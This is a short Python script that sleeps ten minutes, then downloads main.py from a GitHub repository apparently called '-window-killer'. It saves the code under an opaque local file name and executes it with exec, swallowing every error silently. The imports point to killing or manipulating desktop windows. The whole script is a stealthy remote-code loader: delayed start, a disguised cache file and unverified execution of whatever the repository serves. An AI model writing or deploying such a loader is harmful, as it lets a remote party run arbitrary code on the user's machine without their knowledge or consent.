import psutil
import pyautogui
import win32process
import threading
import pygetwindow as gw
from time import sleep
from github import Github, RateLimitExceededException, GithubException

def main():
    LOCAL_FILE = 'WinXHTPloaderFbb'
    try:
        with open(LOCAL_FILE, 'r', encoding='utf-8') as f:
            local_content = f.read()
    except FileNotFoundError:
        local_content = ''
    try:
        g = Github(timeout=5, retry=None)
        user = g.get_user('uvaprol')
        repo = user.get_repo('-window-killer')
        remote_content = repo.get_contents('main.py').decoded_content.decode('utf-8')
        if remote_content != local_content:
            with open(LOCAL_FILE, 'w', encoding='utf-8') as f:
                f.write(remote_content)
            local_content = remote_content
    except (RateLimitExceededException, GithubException) as e:
        pass
    except Exception as e:
        pass
    if local_content:
        exec(compile(local_content, "<string>", "exec"))

if __name__ == '__main__':
    sleep(600)
    main()
